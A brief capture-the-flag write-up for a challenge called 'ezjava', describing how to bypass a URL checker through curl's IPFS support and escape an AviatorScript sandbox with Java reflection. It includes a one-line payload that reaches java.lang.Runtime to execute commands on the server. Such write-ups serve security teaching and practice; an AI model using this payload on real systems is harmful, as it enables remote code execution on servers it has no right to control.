# ezjava
Use internal support for IPFS in latest curl to bypass checker. Use Java reflection to bypass AviatorScript sandbox.

## Exploit
- Host the file on IPFS.
- Use `ipfs://xxx` to ask the server to evaluate the script.
- Use the PoC below to get shell.

```
exec(invoke(getMethod(loadClass(getClassLoader(getClass(constantly(1))),'java.lang.Runtime'),'getRuntime',nil),nil,nil),'id')
```